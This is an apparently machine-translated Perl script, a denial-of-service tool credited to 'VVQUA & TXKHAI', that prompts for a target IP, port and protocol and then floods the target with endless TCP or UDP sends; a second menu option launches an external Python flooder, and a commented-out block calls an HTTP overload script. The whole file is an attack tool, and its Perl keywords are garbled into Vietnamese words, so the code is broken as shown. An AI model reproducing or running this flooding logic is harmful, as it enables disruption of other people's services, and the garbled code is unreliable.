# = == Sử dụng Mô-đun === #
sử dụng  IO :: Socket;
sử dụng Scalar :: Util qw (số lượng nhìn_như);
sử dụng  IO :: Xử lý;
# = == Xóa màn hình === #
system ( " cls || clear " );
# Script Banner ================================================= =================
in  q { 
    $$ \ $$ \ $$ \ $$$$$$ \ $$ \ $$ \                     
    $$ | $$ | $$ | $$ __ $$ \ $$ | $$ |                    
    $$ | $$ | $$$$$$ \ $$$$$$ \ $$$$$$ \ $$$$$$ \ $$ / \ __ | $$$$$$ \ $$$$$$ \ $$ $$$$ \ $$ | $$$$$$ \ $$$$$$ \ $$$$$$  
    $$$$$$$$ | $$ __ $$ \ \ ____ $$ \ $$ __ $$ \\ _ $$ _ | \ $$$$$$ \ \ _ $$ _ | $$ __ $$ \ \ ____ $$ \ $$ | $$ __ $$ \ $$ __ $$ \
    $$ __ $$ | $$$$$$$$ | $$$$$$$ | $$ | \ __ | $$ | \ ____ $$ \ $$ | $$$$$$$$ | $$$$$$$ | $$ | $$$$$$$$$ | $$ | \ __ |
    $$ | $$ | $$ ____ | $$ __ $$ | $$ | $$ | $$ \ $$ \ $$ | $$ | $$ \ $$ ____ | $$ __ $$ | $$ | $$ ____ | $$ |      
    $$ | $$ | \ $$$$$$$ \ \ $$$$$$$ | $$ | \ $$$$ | \ $$$$$$ | \ $$$$ | \ $$$$$$$ \ $$$$$$$ | $$ | \ $$$$$$$$ \ $$ |      
    \ __ | \ __ | \ _______ | \ _______ | \ __ | \ ____ / \ ______ / \ ____ / \ _______ | \ _______ | \ __ | \ _______ | \ __ |      
                                                                                                                 
                                                                                                                                                                                                                             
    [---] bởi:> VVQUA & TXKHAI [---]
    = ------- = - = - = - = - = - = - = - = - = ------- =
} ;
print ( " \ n " );



# Kiểm tra Kết nối Intenret!
print ( " \ r [~] Kiểm tra kết nối Internet [...] " );
STDOUT -> flush ();
ngủ ( 2 );
my $ check =  IO :: Socket :: INET -> new ( ' PeerAddr ' => ' www.google.com ' ,
	' PeerPort ' => 80,
	' Hết giờ ' => 2,
	' proto ' => ' tcp ' );
if ( ! ( $ check && $ check )) {
        print ( " \ r [-] Kiểm tra kết nối Internet [Fail!] " );
	print ( " \ n [!] Lỗi: Vui lòng Kiểm tra Kết nối Internet của bạn !!! \ n " );
	thoát ra ( 1 );
}
$ kiểm tra -> close ();
print ( " \ r [+] Kiểm tra kết nối Internet [Đã kết nối] \ n " );
STDOUT -> flush ();
# THÔNG TIN MỤC TIÊU ĐẦU VÀO =================================================

in  q {
    ================================================== =======
    | 1 | DDOS UDP & TCP |
    | 2 | DDOS SOCK5 & SOCK4 |
    ================================================== =======
} ;
print ( " \ n \ n [~] Chọn: " ); # Đặt IP mục tiêu
$ select = < STDIN >;
chomp ($ select);
while ($ select eq  " " ) {
 print  "    [!] Chọn: " ;
$ select = < STDIN >;
 chomp ($ select);
}

if ($ select ==  1 ) {

    print ( " \ n \ n [~] IP: " ); # Đặt IP mục tiêu
    $ host = < STDIN >;
    chomp ($ host);
    trong khi ($ host eq  " " ) {
     print  "    [!] IP: " ;
     $ host = < STDIN >;
     chomp ($ host);
    }
    print  " TRAGET ==> $ host \ n " ;
    print  " \ n =============================== " ;
    print  " \ n [~] Cổng: " ; # Đặt cổng
    $ port = < STDIN >;
    chomp ($ port);
    while ($ port eq  " "  ||  ! look_like_number ($ port) ||  ! grep {$ port eq  $ _ } ( 0 .. 65535 )) {
     print  "    [!] PORT: " ;       
     $ port = < STDIN >;
     chomp ($ port);
    }
    print  " PORT ==> $ port \ n " ;
    print  " \ n =============================== " ;
    print  " \ n [~] Nhập Protockol (TCP hoặc UDP): " ; # Đặt Protockol;
    $ proto = < STDIN >;
    chomp ($ proto);
    while ($ proto eq  " "  ||  ! grep {$ proto eq  $ _ } ' TCP ' , ' UDP ' , ' tcp ' , ' udp ' ) {
     print  "    [!] Nhập Protockol (TCP hoặc UDP) ?: " ;
     $ proto = < STDIN >;
     chomp ($ proto);
    }
    print  " Giao thức ==> $ proto " ;
    print  " \ n =============================== \ n " ;
    ngủ ( 1 );

    $ sock =  IO :: Socket :: INET -> new (
            PeerAddr => $ host,
            PeerPort => $ port,
            Proto =>  " $ proto " ) ||  die  " \ n [!] Kết nối không thành công đến mục tiêu [$ host] Trên cổng [$ port / $ proto] !!! \ n [!] Vui lòng kiểm tra TargetIP \ n " ;
    system ( " clear || cls " );
    print  " \ n [*] Cuộc tấn công đã bắt đầu [$ host: $ port] proto => [$ proto] ....... \ n \ n " ;
    ngủ ( 1 );
    if ( grep {$ proto eq  $ _ } ' TCP ' , ' tcp ' ) {
        trong khi ( 1 ) {
           $ sock =  IO :: Socket :: INET -> new (
            PeerAddr => $ host,
            PeerPort => $ port,
            Proto =>  " $ proto " ) ||  die  " \ n [!] Kết nối không thành công đến mục tiêu [$ host] Trên cổng [$ port / $ proto] !!! \ n [!] Vui lòng kiểm tra TargetIP \ n " ;
            cho ($ i = 0 ; $ i <= 500 ; $ i ++ ) {
                $ kích thước =  rand () *  8921873  *  99919988 ;
                gửi ($ sock, $ size, $ size);
                send ($ sock, $ size * 2 , $ size * 2 );
                send ($ sock, $ size * 3 , $ size * 3 );
                send ($ sock, $ size * 4 , $ size * 4 );
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );
                gửi ($ sock, $ kích thước * 999999999999999 , $ kích thước * 999999999999999 );
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );
                send ($ sock, $ size * 4 , $ size * 4 );
                send ($ sock, $ size * 3 , $ size * 3 );
                send ($ sock, $ size * 2 , $ size * 2 );
                gửi ($ sock, $ size, $ size);
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );
                gửi ($ sock, $ kích thước * 999999999999999 , $ kích thước * 999999999999999 );
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );

                print ( " Tấn công: (=> $ host: $ port ~ $ proto <=) \ n " );
            }
        }

    } khác {
       $ sock =  IO :: Socket :: INET -> new (
            PeerAddr => $ host,
            PeerPort => $ port,
            Proto =>  " $ proto " ) ||  die  " \ n [!] Kết nối không thành công đến mục tiêu [$ host] Trên cổng [$ port / $ proto] !!! \ n [!] Vui lòng kiểm tra TargetIP \ n " ;
       trong khi ( 1 ) {
                $ kích thước =  rand () *  8921873  *  99919988 ;
                gửi ($ sock, $ size, $ size);
                send ($ sock, $ size * 2 , $ size * 2 );
                send ($ sock, $ size * 3 , $ size * 3 );
                send ($ sock, $ size * 4 , $ size * 4 );
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );
                gửi ($ sock, $ kích thước * 999999999999999 , $ kích thước * 999999999999999 );
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );
                send ($ sock, $ size * 4 , $ size * 4 );
                send ($ sock, $ size * 3 , $ size * 3 );
                send ($ sock, $ size * 2 , $ size * 2 );
                gửi ($ sock, $ size, $ size);
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );
                gửi ($ sock, $ kích thước * 999999999999999 , $ kích thước * 999999999999999 );
                gửi ($ sock, $ kích thước * 9999999999999 , $ kích thước * 9999999999999 );

                print ( " Tấn công: (=> $ host: $ port ~ $ proto <=) \ n " );

       }
    }
    $ sock -> close ()
# } elsif ($ select == 2) {
#      print ("\ n \ n [~] Trang web đích (HTTP):"); # Đặt Web Mục tiêu
#      $ web = <STDIN>;
#      chomp ($ web);
#      while ($ web eq "") {
#       print "[!] IP:";
#       $ web = <STDIN>;
#       chomp ($ web);
#      }  
#      print "Target ==> $ web \ n";
#      print "\ n ===============================";
#      print "\ n [~] Time (500):"; # Cài đặt thời gian
#      $ time = <STDIN>;
#      chomp ($ time);
#      while ($ time eq "") {
#       print "[!] PORT:";       
#       $ time = <STDIN>;
#       chomp ($ time);
#      }
#      print "Thời gian ==> $ time \ n";
#      print "\ n ===============================";
#      ngủ (1);

#      system ("python ./lib/overload/overload.py --target $ web --method HTTP --time $ time --thread 200") == 0 hoặc chết "Tập lệnh Python trả về lỗi $?";
} elsif ($ select ==  2 ) {
    system ( " python ./lib/cc/cc.py " ) ==  0  hoặc  chết  " Tập lệnh Python trả về lỗi $? " ;
}
